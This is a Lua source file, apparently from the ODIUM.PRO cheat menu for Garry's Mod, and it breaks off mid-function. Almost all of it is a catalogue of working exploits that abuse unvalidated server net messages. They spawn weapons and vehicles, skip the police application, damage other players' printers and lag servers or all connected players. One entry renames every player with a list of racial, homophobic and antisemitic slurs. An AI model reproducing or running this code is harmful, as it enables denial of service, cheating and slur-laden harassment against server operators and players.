    vars = {},
    scan = function() return KV.ValidNetString("race_accept") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "race_accept")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Give me wheels",
        },
    },
})

KV.AddExploit("Vehicle Exploit", {
    desc = "Force any player into a vehicle",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("simfphys_request_seatswitch") end,
    hooks = {
        Think = function(tbl, sploit)
            local exploit = function(pl, veh, s)
                KV.NetStart(sploit, "simfphys_request_seatswitch", true)
                net.WriteEntity(veh)
                net.WriteEntity(pl)
                net.WriteInt(s, 32)
                net.SendToServer()
            end

            local ply = KV.GetStored("vx_ply", {})[1]
            local vehicle = KV.GetStored("vx_veh", {})[1]
            local seat = nil
            local pSeats = {}

            if IsValid(ply) and IsValid(vehicle) then
                if isfunction(vehicle.GetRPM) and not IsValid(vehicle:GetDriver()) then return exploit(ply, vehicle, 0) end

                for k, v in ipairs(ents.GetAll()) do
                    if v:GetParent() == vehicle then
                        table.insert(pSeats, v)
                    end
                end

                for k, v in ipairs(pSeats) do
                    for k2, v2 in ipairs(player.GetAll()) do
                        if v2:GetVehicle() == v then continue end
                    end

                    return exploit(ply, vehicle, k)
                end
            end
        end,
    },
    functions = {
        {
            typ = "player",
            addr = "vx_ply",
            Name = "Player"
        },
        {
            typ = "entity",
            addr = "vx_veh",
            Name = "Vehicle",
            tbl = function() return KV.ents.FindByGlobal("GetDriverSeat") end
        },
        {
            typ = "func",
            Name = "Do it",
        },
    },
})

KV.AddExploit("Vehicle Exploit", {
    desc = "Give yourself a firetruck",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("race_accept") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "FIRE_CreateFireTruck")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Give me wheels",
        },
    },
})

KV.AddExploit("Weapons Exploit", {
    desc = "Give yourself any weapon",
    severity = 50,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("give_me_weapon") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "give_me_weapon")
            net.WriteString(KV.GetStored("weapons1"))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Weapon Class",
            default = "weapon_rpg",
            addr = "weapons1"
        },
        {
            typ = "func",
            Name = "Give me artillery",
        },
    },
})

KV.AddExploit("Weapons Exploit", {
    desc = "Give yourself an explosion spell",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("hpwrewrite_achievement1") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "hpwrewrite_achievement1")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Give me artillery",
        },
    },
})

KV.AddExploit("Weapons Exploit", {
    desc = "Give yourself any weapon",
    severity = 50,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("CraftSomething") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "CraftSomething")
            net.WriteEntity(KV.GetLP())
            net.WriteString(KV.GetStored("weapons2"))
            net.WriteString("")
            net.WriteString("weapon")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Weapon Class",
            default = "weapon_rpg",
            addr = "weapons2"
        },
        {
            typ = "func",
            Name = "Give me artillery",
        },
    },
})

KV.AddExploit("Weapons Exploit", {
    desc = "Give yourself any weapon",
    severity = 50,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("SquadGiveWeapon") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "SquadGiveWeapon")
            net.WriteString(KV.GetStored("weapons3"))
            net.WriteEntity(KV.GetLP())
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Weapon Class",
            default = "weapon_rpg",
            addr = "weapons3"
        },
        {
            typ = "func",
            Name = "Give me artillery",
        },
    },
})

KV.AddExploit("Weapons Exploit", {
    desc = "Give yourself any weapon. (works but requires an admin to have used !give at least once since server start)",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("giveweapon") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "giveweapon")
            net.WriteString(KV.GetStored("weapons4"))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Weapon Class",
            default = "weapon_rpg",
            addr = "weapons4"
        },
        {
            typ = "func",
            Name = "Give me artillery",
        },
    },
})

KV.AddExploit("Weapons Exploit", {
    desc = "Give yourself any weapon",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("CRAFTINGMOD_INVENTORY") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "CRAFTINGMOD_INVENTORY")

            net.WriteTable({
                type = 4,
                SWEP = KV.GetStored("weapons5"),
                SKIN = 0
            })

            net.WriteInt(0, 16)
            net.WriteString(tostring(CRAFTINGMOD.PANELS.Inventory_ID))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Weapon Class",
            default = "weapon_rpg",
            addr = "weapons5"
        },
        {
            typ = "func",
            Name = "Give me artillery",
        },
    },
})

KV.AddExploit("Weapons Exploit", {
    desc = "Give or take weapons to/from yourself",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("dialogAlterWeapons") end,
    hooks = {
        Think = function(tbl, sploit)
            local weaps = {}
            KV.NetStart(sploit, "dialogAlterWeapons", true)
            net.WriteString(tbl[1])

            if tbl[2] == "All" then
                if tbl[1] == "Remove" then
                    for k1, v1 in pairs(v:GetWeapons()) do
                        table.insert(weaps, v1:GetClass())
                    end
                elseif tbl[1] == "Add" then
                    for k1, v1 in pairs(weapons.GetList()) do
                        weaps[#weaps + 1] = v1.ClassName
                    end
                end
            else
                weaps = string.Split(KV.GetStored("scpwx_weaps", "weapon_rpg,weapon_smg1"), ",")
            end

            net.WriteTable(weaps)
            net.WriteEntity(KV.GetLP())
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Weapons",
            default = "weapon_rpg,weapon_smg1",
            addr = "scpwx_weaps"
        },
        {
            typ = "func",
            Name = "Give",
            args = {"Add"}
        },
        {
            typ = "func",
            Name = "Take",
            args = {"Remove"}
        },
        {
            typ = "func",
            Name = "Strip",
            args = {"Remove", "All"}
        },
        {
            typ = "func",
            Name = "Give All",
            args = {"Add", "All"}
        },
    },
})

KV.AddExploit("Weapons Exploit", {
    desc = "Give yourself any weapon",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("R_PERM.BuyFromShopNPC") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "R_PERM.BuyFromShopNPC")

            net.WriteTable({
                type = "Weapon",
                class = KV.GetStored("weapons6"),
                price = 0
            })

            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Weapon Class",
            default = "weapon_rpg",
            addr = "weapons6"
        },
        {
            typ = "func",
            Name = "Give me artillery",
        },
    },
})

KV.AddExploit("Weapons Exploit", {
    desc = "Give yourself default weapons",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("XMH_HandleWeapons") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "XMH_HandleWeapons")
            net.WriteString("xmh_givehl2weapons")
            net.SendToServer()
            KV.NetStart(sploit, "XMH_HandleWeapons")
            net.WriteString("xmh_givegmweapons")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Give me artillery",
        },
    },
})

KV.AddExploit("Ammo Exploit", {
    desc = "Get unlimited ammo for every weapon",
    severity = 50,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function() return KV.ValidNetString("TCBBuyAmmo") and net.Receivers["tcbsendammo"] end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in pairs(GAMEMODE.AmmoTypes) do
                KV.NetStart(sploit, "TCBBuyAmmo")

                net.WriteTable({nil, v.ammoType, nil, "0", "999999"})

                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Weapon Class",
            default = "weapon_rpg",
            addr = "weapons2"
        },
        {
            typ = "func",
            Name = "Give me artillery",
        },
    },
})

KV.AddExploit("Join Police", {
    desc = "Join the police force without going through the fucking form",
    severity = 50,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("PoliceJoin") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "PoliceJoin")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Become a cop",
        },
    },
})

KV.AddExploit("Join Police", {
    desc = "Join the police force without going through the fucking form",
    severity = 50,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("CpForm_Answers") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "CpForm_Answers")
            net.WriteEntity(KV.GetLP())
            net.WriteTable({})
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Become a cop",
        },
    },
})

KV.AddExploit("Printer Smasher", {
    desc = "Apply constant damage to any printers nearby",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    msgs_per_tick = 3,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("customprinter_get") end,
    hooks = {
        Tick = function(tbl, sploit)
            for k, v in ipairs(KV.ents.FindByGlobal("IsCustomHQ")) do
                if v:GetPos():Distance(KV.GetLP():GetPos()) <= 750 then
                    KV.NetStart(sploit, "customprinter_get")
                    net.WriteEntity(v)
                    net.WriteString("onoff")
                    net.SendToServer()
                    KV.NetStart(sploit, "customprinter_get")
                    net.WriteEntity(v)
                    net.WriteString("c_off")
                    net.SendToServer()
                    KV.NetStart(sploit, "customprinter_get")
                    net.WriteEntity(v)
                    net.WriteString("p_up")
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

local Names = {"Nigger", "Faggot", "Kike", "Cuckmaster", "Skid", "GetODIUM.PRO", "ODIUM.PRO", "Shit", "Piss", "Permavirgin", "CitizenRat", "Feminist", "Fuckhead", "Cunt", "ODIUM.PRO", "CockWart", "DickTickle", "FuckAdmins", "Paidmin", "ShitServer"}

KV.AddExploit("Name Changer", {
    desc = "Destroy everybodys RPNames",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("NC_GetNameChange") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(player.GetAll()) do
                KV.NetStart(sploit, "NC_GetNameChange")
                net.WriteEntity(v)
                net.WriteString(table.Random(Names))
                net.WriteString(table.Random(Names))
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Lag the shit out of the server",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    msgs_per_tick = 3,
    times_per_tick = 300,
    prevalidated = true,
    scan = function() return KV.ValidNetString("ATS_WARP_REMOVE_CLIENT", "ATS_WARP_FROM_CLIENT", "ATS_WARP_VIEWOWNER") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "ATS_WARP_REMOVE_CLIENT")
            net.WriteEntity(KV.GetLP())
            net.WriteString("adminroom1")
            net.SendToServer()
            KV.NetStart(sploit, "ATS_WARP_FROM_CLIENT")
            net.WriteEntity(KV.GetLP())
            net.WriteString("adminroom1")
            net.SendToServer()
            KV.NetStart(sploit, "ATS_WARP_VIEWOWNER")
            net.WriteEntity(KV.GetLP())
            net.WriteString("adminroom1")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Lag the shit out of the server",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 3,
    msgs_per_tick = function() return player.GetCount * 3 end,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function() return KV.ValidNetString("CFCreateGame", "CFJoinGame", "CFRemoveGame", "CFEndGame") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(player.GetAll()) do
                KV.NetStart(sploit, "CFRemoveGame")
                net.WriteFloat(math.Round("10000\n"))
                net.SendToServer()
                KV.NetStart(sploit, "CFJoinGame")
                net.WriteFloat(math.Round("10000\n"))
                net.SendToServer()
                KV.NetStart(sploit, "CFEndGame")
                net.WriteFloat("10000\n")
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Moves the server onto an african ISP (Discovered by niku)",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("CreateCase") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "CreateCase")
            net.WriteString("tapped by ODIUM.PRO")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Gee I wonder what this does",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("rprotect_terminal_settings") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "rprotect_terminal_settings")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Causes more lag on servers already lagging",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("StackGhost") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "StackGhost")
            net.WriteInt(0xFFFFFFFF, 32)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Instantly brings large servers to a crawl",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("tbfy_surrender") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "tbfy_surrender")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Creates a lot of lag",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("RXCar") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"RXCar_BuyCar_C2S", "RXCAR_UpdateINVCar_C2S", "RXCAR_Shop_Store_C2S", "RXCAR_Shop_Sell_C2S", "RXCAR_RespawnINV_C2S", "RXCAR_SellINVCar_C2S", "RXCAR_Shop_Buy_C2S", "RXCAR_RequestTuneData_C2S"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Creates a lot of lag",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("NewReport") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "NewReport")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Client Lagger", {
    desc = "Causes ALL players to lag out",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    msgs_per_tick = 2,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function()
        local num = KV.RecursiveGetVar(CF, {"FlipPriceMinimum"}, "number")

        return KV.ValidNetString("CFCreateGame", "CFJoinGame", "CFRemoveGame", "CFEndGame")
    end,
    --&& isnumber(num) && num <= 0 end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "CFCreateGame")
            net.WriteFloat(0)
            net.WriteFloat(0)
            net.SendToServer()
        end,
        net = {
            Receive = function(sploit, strName)
                if strName == "CFAnnounce" then return false end
            end,
        },
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Client Lagger", {
    desc = "Causes players to lag out",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    msgs_per_tick = function(sploit) return #KV.GetStored("clagger1_plyz", {}) end,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("PrtToPlayers") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("clagger1_plyz", {})) do
                if IsValid(v) then
                    KV.NetStart(sploit, "PrtToPlayers")
                    net.WriteEntity(v)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "clagger1_plyz"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Client Lagger", {
    desc = "Mom get off the phone I'm trying to play Runescape!",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("scoreboard.country") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "scoreboard.country")
            net.WriteString(system.GetCountry())
            net.SendToServer()
        end,
        net = {
            Receive = function(sploit, strName)
                if strName == "scoreboard.country" then return false end
            end,
        },
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Client Lagger", {
    desc = "Dial-up internet bro!",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("gMining.registerWeapon") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "gMining.registerWeapon")
            net.WriteTable({})
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Client Lagger", {
    desc = "Dab on the players",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("JukeBox_PlayersTunedIn") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "JukeBox_PlayersTunedIn")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Client Lagger", {
    desc = "Remind everyone what it feels like to game on a notebook",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("pac_to_contraption") end,
    hooks = {
        Think = function(tbl, sploit)
            local tbl = KV.RecursiveGetVar(sploit, {"vars", "tbl"}, "table", true)

            if not tbl or #tbl == 0 then
                for i = 1, 60 do
                    tbl[#tbl + 1] = {
                        id = i,
                        mdl = "models/error.mdl",
                        pos = Vector(0, 0, 0),
                        ang = Angle(0, 0, 0),
                        clr = Color(0, 0, 0),
                        skn = 0
                    }
                end
            end

            KV.NetStart(sploit, "pac_to_contraption")
            net.WriteTable(tbl)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Client Lagger", {
    desc = "Lag out all nearby players",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function() return KV.ValidNetString("bodyman_model_change") and istable(BODYMAN) end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "bodyman_model_change")
            net.WriteInt(0, 8)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Client Lagger", {
    desc = "Mom get off the phone I'm trying to play Runescape!",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function() return KV.ValidNetString("GotCountry") and istable(playerCountryTable) end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "GotCountry")
            net.WriteString(KV.GetStored("clc1", system.GetCountry()))
            net.SendToServer()
        end,
        net = {
            Receive = function(sploit, strName)
                if strName == "CountryToTable" then return false end
            end,
        },
    },
    functions = {
        {
            typ = "bool",
        },
        {
            typ = "string",
            Name = "Country (ISO 3166-1)",
            default = system.GetCountry(),
            addr = "clc1"
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Causes lag and bombs the server console",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("steamid2") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "steamid2")
            net.WriteString("ODIUM.PRO > ALL")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Poison the server",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("start_alch") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "start_alch")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "OMG DDOS!?!?",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("netKeycard") or KV.DynamicNetString("netFKeycard") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit, function()
                net.WriteEntity(KV.GetLP())
            end)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"netFKeycardAdminSpawn", "netFKeycardSpawn", "netFKeycardHackSpawn", "netFKeycardSAddLevel", "netFKeycardSRemoveLevel", "netKeycardSAddPlayer", "netKeycardSRemovePlayer", "netKeycardSpawn", "netKeycardHackSpawn", "netKeycardAdminSpawn"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Few second lag spikes at best but could probably cripple some smaller servers",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("ctOS-Box-Hacked") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "ctOS-Box-Hacked")
            net.WriteEntity(KV.GetLP())
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Meant to cause excessive lag but ends up just overflowing local host, needs work",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    vars = {},
    scan = function() return KV.ValidNetString("ViewClaims") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "ViewClaims")
            net.SendToServer()
        end,
        net = {
            Receive = function(sploit, strName)
                if strName == "ViewClaims" then return false end
            end,
        },
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

--[[local pModel = 0;
KV.AddExploit( "Lagsploit", {
    desc = "Causes lag as well as either T-Posing you or breaking your anims",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function() return (KV.ValidNetString( "bodyman_model_change" ) && KV.GetLP().getJobTable != nil) end,
    hooks = {
        Think = function(tbl, sploit)
            local job = KV.GetLP():getJobTable()
            local playermodels = job.model
            if pModel < #playermodels then
                pModel = pModel + 1
                KV.NetStart( sploit, "bodyman_model_change")
                net.WriteInt( pModel, 8 )
                net.SendToServer()
            else
                pModel = 0
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )]]
KV.AddExploit("Lagsploit", {
    desc = "Drag the server to it's knees",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("DW_GUNLAB_UPDATEORB") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "DW_GUNLAB_UPDATEORB")

            for i = 1, 4 do
                net.WriteInt(i, 4)
            end

            net.WriteInt(KV.GetLP():EntIndex(), 32)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Relatively strong exploit, can cause 5-10 second spikes",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("DW_PLAYSONG") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "DW_PLAYSONG")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Imagine playing on a server in China while torrenting",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("selfportrait_idonthavehands") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "selfportrait_idonthavehands")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Causes some pretty hectic spikes",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("dw_toggle_item") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "dw_toggle_item")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Few seconds of lag at a time, just enough to be annoying",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("tupacBail.bailPlayer") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, 'tupacBail.bailPlayer')
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Fill the servers vulnerable little holes",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function() return ulx and ulx.friends and KV.ValidNetString("sendtable") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "sendtable")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Brutalize the poor unsuspecting server",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("vloot_pickup_request") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "vloot_pickup_request")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Remember kids, always trust the client",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("disguise") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "disguise")
            net.WriteInt(0xFFFFFFFF, 32)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Brew a 0xFFFFFFFF potion",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("NET_AM_MakePotion") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "NET_AM_MakePotion")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Pew pew",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("orgcheckname") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "orgcheckname")
            net.WriteString("ODIUM.PRO")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Old but should still work",
    severity = 90,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("dLogsGetCommand") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "dLogsGetCommand")

            net.WriteTable({
                cmd = "+forward",
                args = "ODIUM.PRO"
            })

            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Same shit, different smell",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("ItemStore") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit, function()
                net.WriteEntity(KV.GetLP())
            end)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"ItemStoreSyncItem", "ItemStoreMerge", "ItemStoreUse", "ItemStoreSplit", "ItemStoreSyncItem2"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "This addon has quite a few exploits",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("ats_send_toServer") end,
    hooks = {
        Think = function(tbl, sploit)
